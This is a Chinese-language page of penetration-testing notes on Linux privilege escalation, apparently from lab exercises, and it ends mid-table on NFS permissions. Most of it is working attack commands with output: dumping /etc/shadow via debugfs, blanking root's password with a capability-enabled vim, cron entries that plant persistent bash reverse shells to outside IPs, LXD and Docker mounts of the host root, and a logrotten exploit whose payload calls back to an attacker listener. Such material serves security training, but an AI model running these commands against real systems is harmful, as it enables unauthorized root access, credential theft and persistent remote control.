<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">debugfs /dev/sda1</span><br><span class="line">dump /etc/shadow /tmp/shadow_copy</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<h2 id="ADM"><a href="#ADM" class="headerlink" title="ADM"></a>ADM</h2><p>ADM 组的成员可以读取 <code>/var/log</code> 中存储的所有日志。这不会直接授予 root 访问权限，但可以利用该权限收集日志文件中存储的敏感数据或枚举用户操作和正在运行的 cron 作业。</p>
<p><a target="_blank" rel="noopener" href="https://linux.die.net/man/8/aureport">aureport</a> 是一个生成审计系统日志摘要报告的工具。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aureport --tty | less</span><br></pre></td></tr></table></figure>

<h1 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h1><p>Linux Capabilities 是 Linux 操作系统中的一项安全功能，允许向进程授予特定权限，从而使它们能够执行原本受限制的特定操作。</p>
<p>一种常见的漏洞是利用功能向未充分沙盒化或与其他进程隔离的进程授予特权，从而允许提升其特权并访问敏感信息或执行未经授权的操作。另一个潜在的漏洞是滥用或过度使用功能，这可能导致进程拥有超出其需要的权限。</p>
<p>设置可执行文件的功能：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>能力</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>cap_sys_admin</code></td>
<td>允许以管理权限执行操作，例如修改系统文件或更改系统设置。</td>
</tr>
<tr>
<td><code>cap_sys_chroot</code></td>
<td>允许更改当前进程的根目录，允许其访问原本无法访问的文件和目录。</td>
</tr>
<tr>
<td><code>cap_sys_ptrace</code></td>
<td>允许附加并调试其他进程，可能允许其访问敏感信息或修改其他进程的行为。</td>
</tr>
<tr>
<td><code>cap_sys_nice</code></td>
<td>允许提高或降低进程的优先级，从而可能使其获得原本受到限制的资源的访问权限。</td>
</tr>
<tr>
<td><code>cap_sys_time</code></td>
<td>允许修改系统时钟，可能允许它操纵时间戳或导致其他进程以意外的方式运行。</td>
</tr>
<tr>
<td><code>cap_sys_resource</code></td>
<td>允许修改系统资源限制，例如打开文件描述符的最大数量或可分配的最大内存量。</td>
</tr>
<tr>
<td><code>cap_sys_module</code></td>
<td>允许加载和卸载内核模块，可能允许其修改操作系统的行为或获取敏感信息。</td>
</tr>
<tr>
<td><code>cap_net_bind_service</code></td>
<td>允许绑定到网络端口，可能允许其访问敏感信息或执行未经授权的操作。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>=</code></td>
<td>此值设置可执行文件的指定功能，但不授予任何权限。如果想清除可执行文件的先前设置的功能，这将很有用。</td>
</tr>
<tr>
<td><code>+ep</code></td>
<td>此值将指定功能的有效权限和允许权限授予可执行文件。这允许可执行文件执行功能允许的操作，但不允许其执行功能不允许的任何操作。</td>
</tr>
<tr>
<td><code>+ei</code></td>
<td>此值授予可执行文件足够的、可继承的指定权限。这允许可执行文件执行该权限允许的操作，并且可执行文件生成的子进程可以继承该权限并执行相同的操作。</td>
</tr>
<tr>
<td><code>+p</code></td>
<td>此值将指定功能的允许权限授予可执行文件。这允许可执行文件执行功能允许的操作，但不允许它执行功能不允许的任何操作。如果想将功能授予可执行文件，但阻止它继承功能或允许子进程继承功能，这将很有用。</td>
</tr>
</tbody></table>
<p>有多种 Linux Capabilities 可用于将用户权限升级到<code>root</code>，其中包括：</p>
<table>
<thead>
<tr>
<th>能力</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>cap_setuid</code></td>
<td>允许进程设置其有效用户ID，该ID可用于获取其他用户（包括该<code>root</code>用户）的权限。</td>
</tr>
<tr>
<td><code>cap_setgid</code></td>
<td>允许设置其有效组ID，该组ID可用于获取另一个组（包括该<code>root</code>组）的权限。</td>
</tr>
<tr>
<td><code>cap_sys_admin</code></td>
<td>此功能提供广泛的管理权限，包括执行许多为用户保留的操作的能力<code>root</code>，例如修改系统设置以及挂载和卸载文件系统。</td>
</tr>
<tr>
<td><code>cap_dac_override</code></td>
<td>允许绕过文件读取、写入和执行权限检查。</td>
</tr>
</tbody></table>
<h2 id="enumeration"><a href="#enumeration" class="headerlink" title="enumeration"></a>enumeration</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap &#123;&#125; \;</span><br><span class="line"></span><br><span class="line">/usr/bin/vim.basic cap_dac_override=eip</span><br><span class="line">/usr/bin/ping cap_net_raw=ep</span><br><span class="line">/usr/bin/mtr-packet cap_net_raw=ep</span><br></pre></td></tr></table></figure>

<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ getcap /usr/bin/vim.basic</span><br><span class="line"></span><br><span class="line">/usr/bin/vim.basic cap_dac_override=eip</span><br><span class="line"></span><br><span class="line">$ /usr/bin/vim.basic /etc/passwd</span><br><span class="line"># 修改为这样，就可以无密码 su root</span><br><span class="line">root::0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>可以用以下命令在非交互模式下执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;:%s/^root:[^:]*:/root::/\nwq!&#x27; | /usr/bin/vim.basic -es /etc/passwd</span><br></pre></td></tr></table></figure>

<h1 id="Cron-Job-Abuse"><a href="#Cron-Job-Abuse" class="headerlink" title="Cron Job Abuse"></a>Cron Job Abuse</h1><p>root crontab 几乎总是只能由根用户或具有完整 sudo 权限的用户编辑；但是，它仍然可能被滥用。根用户身份运行的可写入脚本，即使您无法读取 crontab 以了解确切的时间表，您也可能能够确定它运行的频率（即，每 12 小时创建一个 .tar.gz 文件的备份脚本）。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Usage:  crontab [-u user] [-n] file</span><br><span class="line">        crontab [ -u user ] [ -i ] &#123; -e | -l | -r &#125;</span><br><span class="line">        file		从文件中导入定时任务(默认替换)</span><br><span class="line">        -u &lt;user&gt;	指定要操作的用户的 crontab 文件(root)</span><br><span class="line">        -e			编辑当前用户的定时任务文件</span><br><span class="line">        -l			当前用户的定时任务列表</span><br><span class="line">        -r			删除当前用户的定时任务文件</span><br><span class="line"></span><br><span class="line">crontab 文件格式:</span><br><span class="line">* * * * * command</span><br><span class="line">- - - - -</span><br><span class="line">| | | | |</span><br><span class="line">| | | | +---- 星期几 (0 - 7) (星期日为 0 或 7)</span><br><span class="line">| | | +------ 月份 (1 - 12)</span><br><span class="line">| | +-------- 一个月中的第几天 (1 - 31)</span><br><span class="line">| +---------- 小时 (0 - 23)</span><br><span class="line">+------------ 分钟 (0 - 59)</span><br><span class="line">example:</span><br><span class="line">* * * * * /path/to/script.sh			每分钟运行一次脚本</span><br><span class="line">*/10 * * * * /path/to/script.sh			每隔 10 分钟运行一次脚本</span><br><span class="line">5,35 * * * * /path/to/script.sh			每小时的第 5 分钟和第 35 分钟运行脚本</span><br><span class="line">0 15 * * 1,2 /path/to/script.sh			每周一和周二的下午 3 点运行脚本</span><br><span class="line"></span><br><span class="line">crontab 支持一些特殊字符串来简化时间设置:</span><br><span class="line">@reboot					系统启动时运行一次</span><br><span class="line">@yearly					或 @annually：每年运行一次，相当于 0 0 1 1 *</span><br><span class="line">@monthly				每月运行一次，相当于 0 0 1 * *</span><br><span class="line">@weekly					每周运行一次，相当于 0 0 * * 0</span><br><span class="line">@daily | @midnight		每天运行一次，相当于 0 0 * * *</span><br><span class="line">@hourly					每小时运行一次，相当于 0 * * * *</span><br><span class="line">example:</span><br><span class="line">@reboot /path/to/script.sh</span><br><span class="line">@daily /path/to/daily_script.sh</span><br><span class="line">@weekly /path/to/weekly_script.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务启动:</span></span><br><span class="line">service cron start</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or</span></span><br><span class="line">/etc/init.d/cron &#123;start|stop|status|restart|reload|force-reload&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用crontab命令</span></span><br><span class="line">* * * * * bash -i &gt;&amp; /dev/tcp/192.168.10.128/2222  0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">crontab -l | &#123; cat; echo &quot;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.10.128/2222 0&gt;&amp;1&quot;;&#125; | crontab -</span><br><span class="line"></span><br><span class="line">(crontab -l;printf &quot;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.10.128/2222 0&gt;&amp;1;\rno crontab for `whoami`%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure>

<p>某些应用程序会在 &#x2F;etc&#x2F;cron.d 目录中创建 cron 文件，并且可能配置错误，允许非 root 用户编辑它们。</p>
<p>检查一下系统中是否有可写文件或目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/etc/cron.daily/backup</span><br><span class="line">/dmz-backups/backup.sh</span><br><span class="line">/proc</span><br><span class="line">/sys/fs/cgroup/memory/init.scope/cgroup.event_control</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">/home/backupsvc/backup.sh</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">pspy</a>是一个命令行工具，用于查看正在运行的进程，无需 root 权限。可以使用它来查看其他用户运行的命令、cron 作业等。它的工作原理是扫描<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Procfs">procfs</a>。<code>-pf</code>打印命令和文件系统事件，<code>-i 1000</code>扫描一次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">$ ./pspy64 -pf -i 1000</span><br><span class="line"></span><br><span class="line">pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br><span class="line">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br><span class="line">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br><span class="line">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br><span class="line">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br><span class="line">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ </span><br><span class="line">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ </span><br><span class="line">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  </span><br><span class="line">                   ░           ░ ░     </span><br><span class="line">                               ░ ░     </span><br><span class="line"></span><br><span class="line">Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)</span><br><span class="line">Draining file system events due to startup...</span><br><span class="line">done</span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=999    | /usr/bin/VGAuthService </span><br><span class="line">2020/09/04 20:45:03 CMD: UID=111  PID=990    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation </span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=99     | </span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=988    | /usr/lib/snapd/snapd </span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=1017   | /usr/sbin/cron -f </span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=1010   | /usr/sbin/atd -f </span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=1003   | /usr/lib/accountsservice/accounts-daemon </span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=1001   | /lib/systemd/systemd-logind </span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=10     | </span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=1      | /sbin/init </span><br><span class="line">2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive</span><br><span class="line">2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh </span><br><span class="line">2020/09/04 20:46:01 CMD: UID=0    PID=2200   | /bin/sh -c /dmz-backups/backup.sh </span><br><span class="line">2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache</span><br><span class="line">2020/09/04 20:46:01 CMD: UID=0    PID=2199   | /usr/sbin/CRON -f </span><br><span class="line">2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive</span><br><span class="line">2020/09/04 20:46:01 CMD: UID=0    PID=2203   | </span><br><span class="line">2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive</span><br><span class="line">2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive</span><br><span class="line">2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive</span><br><span class="line">2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html </span><br><span class="line">2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive</span><br><span class="line">2020/09/04 20:46:01 CMD: UID=0    PID=2205   | gzip </span><br><span class="line">2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive</span><br><span class="line">2020/09/04 20:46:03 CMD: UID=0    PID=2206   | /bin/bash /dmz-backups/backup.sh </span><br><span class="line">2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache</span><br><span class="line">2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive</span><br></pre></td></tr></table></figure>

<p>可以看到一个 cron 作业运行位于 &#x2F;dmz-backups 目录中的 backup.sh 脚本，并创建 &#x2F;var&#x2F;www&#x2F;html 目录内容的 tarball 文件。</p>
<p>附加恶意代码，尝试以 root 身份获取反向 shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lnvp 443</span><br><span class="line"></span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882</span><br><span class="line">bash: cannot set terminal process group (9143): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line"></span><br><span class="line">root@NIX02:~#</span><br></pre></td></tr></table></figure>

<h1 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h1><h2 id="LXD"><a href="#LXD" class="headerlink" title="LXD"></a>LXD</h2><p>容器在操作系统层面运行，而虚拟机在硬件层面运行。因此，容器共享操作系统并将应用程序进程与系统其余部分隔离，而传统虚拟化允许多个操作系统在单个系统上同时运行。</p>
<p>Linux 容器 ( <code>LXC</code>) 是一种操作系统级虚拟化技术，允许多个 Linux 系统通过拥有自己的进程但共享主机系统内核在单个主机上彼此隔离地运行。</p>
<p>Linux Daemon ( <a target="_blank" rel="noopener" href="https://github.com/lxc/lxd">LXD</a> ) 在某些方面与之类似，但它被设计为包含一个完整的操作系统。因此，它不是一个应用程序容器，而是一个系统容器。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ id</span><br><span class="line"></span><br><span class="line">uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)</span><br></pre></td></tr></table></figure>

<p>将此容器作为映像导入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp</span><br><span class="line">$ lxc image list</span><br><span class="line"></span><br><span class="line">+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+</span><br><span class="line">|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |</span><br><span class="line">+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+</span><br><span class="line">| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |</span><br><span class="line">+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+</span><br></pre></td></tr></table></figure>

<p>指定标志和容器的根路径来启动镜像并对其进行配置，<code>security.privileged=true</code>禁用允许在主机上执行操作的所有隔离功能</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ lxc init ubuntutemp privesc -c security.privileged=true</span><br><span class="line">$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</span><br></pre></td></tr></table></figure>

<p>完成上述操作后，就可以启动容器并登录。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ lxc start privesc</span><br><span class="line">$ lxc exec privesc /bin/bash</span><br><span class="line">root@nix02:~#</span><br></pre></td></tr></table></figure>

<h2 id="Docker-1"><a href="#Docker-1" class="headerlink" title="Docker"></a>Docker</h2><p>Docker 是一种流行的开源工具，它为软件应用程序提供可移植且一致的运行时环境。它使用容器作为用户空间中的隔离环境，在操作系统级别运行并共享文件系统和系统资源。</p>
<p>Docker 架构的核心是客户端-服务器模型，其中有两个主要组件：</p>
<ul>
<li>Docker 守护进程</li>
<li>Docker 客户端</li>
</ul>
<h3 id="Docker-共享目录"><a href="#Docker-共享目录" class="headerlink" title="Docker 共享目录"></a>Docker 共享目录</h3><p>共享目录，可以在容器内访问主机系统上的特定目录或文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd /hostsystem/home/cry0l1t3</span><br><span class="line">root@container:~$</span><br></pre></td></tr></table></figure>

<h3 id="Docker-套接字"><a href="#Docker-套接字" class="headerlink" title="Docker 套接字"></a>Docker 套接字</h3><p>Docker 套接字或 Docker 守护程序套接字是一种特殊文件，允许和进程与 Docker 守护程序进行通信。</p>
<p>创建 Docker 容器，将主机的根目录 ( <code>/</code>) 映射到<code>/hostsystem</code>容器上的目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app</span><br><span class="line">$ docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa</span><br></pre></td></tr></table></figure>

<p>通常，此套接字位于<code>/var/run/docker.sock</code>。但是，位置可以不同，这是可以理解的。因为基本上，这只能由 root 或 docker 组写入。</p>
<p>如果不属于这两个组之一的用户，并且 Docker 套接字仍然具有可写的权限，那么可以使用这种情况来提升权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash</span><br><span class="line"></span><br><span class="line">root@ubuntu:~#</span><br></pre></td></tr></table></figure>

<h1 id="Logrotate"><a href="#Logrotate" class="headerlink" title="Logrotate"></a>Logrotate</h1><p>每个 Linux 系统都会生成大量日志文件。为了防止硬盘溢出，一个名为<code>logrotate</code>的工具负责归档或处理旧日志。</p>
<p>Logrotate 本身的功能是重命名日志文件。例如，可以为每个新一天创建新的日志文件，并自动重命名较旧的日志文件。另一个例子是清空最旧的日志文件，从而减少内存消耗。</p>
<p>此工具通常通过<code>cron</code>定期启动并通过配置文件<code>/etc/logrotate.conf</code>进行控制。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/logrotate.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># see &quot;man logrotate&quot; for details</span><br><span class="line"></span><br><span class="line"># global options do not affect preceding include directives</span><br><span class="line"></span><br><span class="line"># rotate log files weekly</span><br><span class="line">weekly</span><br><span class="line"></span><br><span class="line"># use the adm group by default, since this is the owning group</span><br><span class="line"># of /var/log/syslog.</span><br><span class="line">su root adm</span><br><span class="line"></span><br><span class="line"># keep 4 weeks worth of backlogs</span><br><span class="line">rotate 4</span><br><span class="line"></span><br><span class="line"># create new (empty) log files after rotating old ones</span><br><span class="line">create</span><br><span class="line"></span><br><span class="line"># use date as a suffix of the rotated file</span><br><span class="line">#dateext</span><br><span class="line"></span><br><span class="line"># uncomment this if you want your log files compressed</span><br><span class="line">#compress</span><br><span class="line"></span><br><span class="line"># packages drop log rotation information into this directory</span><br><span class="line">include /etc/logrotate.d</span><br><span class="line"></span><br><span class="line"># system-specific logs may also be configured here.</span><br></pre></td></tr></table></figure>

<p>为了利用<code>logrotate</code>，需要满足一些要求。</p>
<ol>
<li>需要日志文件的<code>write</code>权限</li>
<li>logrotate 必须以特权用户身份运行或<code>root</code></li>
<li>易受攻击的版本：<ul>
<li>3.8.6</li>
<li>3.11.0</li>
<li>3.15.0</li>
<li>3.18.0</li>
</ul>
</li>
</ol>
<p>如果满足要求，可以利用名为<a target="_blank" rel="noopener" href="https://github.com/whotwagner/logrotten">logrotten</a>的漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/whotwagner/logrotten.git</span><br><span class="line">$ cd logrotten</span><br><span class="line">$ gcc logrotten.c -o logrotten</span><br><span class="line">$ echo &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.2/9001 0&gt;&amp;1&#x27; &gt; payload</span><br></pre></td></tr></table></figure>

<p>在利用漏洞利用之前，需要确定<code>logrotate</code>使用了哪个选项<code>logrotate.conf</code>，必须使用适合此功能的漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ grep &quot;create\|compress&quot; /etc/logrotate.conf | grep -v &quot;#&quot;</span><br><span class="line"></span><br><span class="line">create</span><br></pre></td></tr></table></figure>

<p>exploit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./logrotten -p ./payload /tmp/tmp.log</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nlvp 9001</span><br><span class="line"></span><br><span class="line">Listening on 0.0.0.0 9001</span><br><span class="line">Connection received on 10.129.24.11 49818</span><br><span class="line"># id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<h1 id="Miscellaneous-Techniques"><a href="#Miscellaneous-Techniques" class="headerlink" title="Miscellaneous Techniques"></a>Miscellaneous Techniques</h1><h2 id="被动流量捕获"><a href="#被动流量捕获" class="headerlink" title="被动流量捕获"></a>被动流量捕获</h2><p>捕获网络上传递的数据，例如<a target="_blank" rel="noopener" href="https://github.com/DanMcInerney/net-creds">net-creds</a>和<a target="_blank" rel="noopener" href="https://github.com/lgandx/PCredz">PCredz</a>。</p>
<h2 id="弱-NFS-权限"><a href="#弱-NFS-权限" class="headerlink" title="弱 NFS 权限"></a>弱 NFS 权限</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ showmount -e 10.129.2.12</span><br><span class="line"></span><br><span class="line">Export list for 10.129.2.12:</span><br><span class="line">/tmp             *</span><br><span class="line">/var/nfs/general *</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>选项</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>root_squash</code></td>
